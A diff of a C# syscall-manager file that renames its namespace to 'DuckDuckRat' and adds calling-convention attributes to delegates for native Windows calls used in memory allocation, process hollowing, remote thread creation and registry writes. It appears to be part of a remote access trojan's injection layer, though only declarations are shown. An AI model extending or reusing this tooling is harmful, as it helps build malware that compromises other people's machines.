@@ -3,7 +3,7 @@ using System.Runtime.InteropServices;
 using System.Collections.Generic;
 using System.Text;
 
-namespace VanguardCore
+namespace DuckDuckRat
 {
     public static unsafe partial class SyscallManager
     {
@@ -39,18 +39,30 @@ namespace VanguardCore
     }
 
     // --- Critical Syscall Delegates (Moved to Namespace Level for Global Access) ---
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate uint NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref UIntPtr regionSize, uint allocationType, uint protect);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate uint NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferLength, out IntPtr bytesWritten);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate uint NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferLength, out IntPtr bytesRead);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate uint NtUnmapViewOfSection(IntPtr processHandle, IntPtr baseAddress);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref SyscallManager.PROCESS_BASIC_INFORMATION processInformation, uint processInformationLength, out uint returnLength);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate uint NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr bytesBuffer);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate uint NtResumeThread(IntPtr threadHandle, out uint suspendCount);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate uint NtFreeVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref UIntPtr regionSize, uint freeType);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate uint NtTerminateProcess(IntPtr processHandle, uint exitStatus);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate uint NtProtectVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref uint regionSize, uint newProtect, out uint oldProtect);
     
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate uint NtCreateKey(out IntPtr keyHandle, uint desiredAccess, ref SyscallManager.OBJECT_ATTRIBUTES objectAttributes, uint titleIndex, IntPtr classStr, uint createOptions, out uint disposition);
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate uint NtSetValueKey(IntPtr keyHandle, ref SyscallManager.UNICODE_STRING valueName, uint titleIndex, uint type, byte[] data, uint cbData);
 
     public static unsafe partial class SyscallManager
@@ -209,3 +221,5 @@ namespace VanguardCore
         [DllImport("kernel32.dll")] static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
     }
 }
+
+
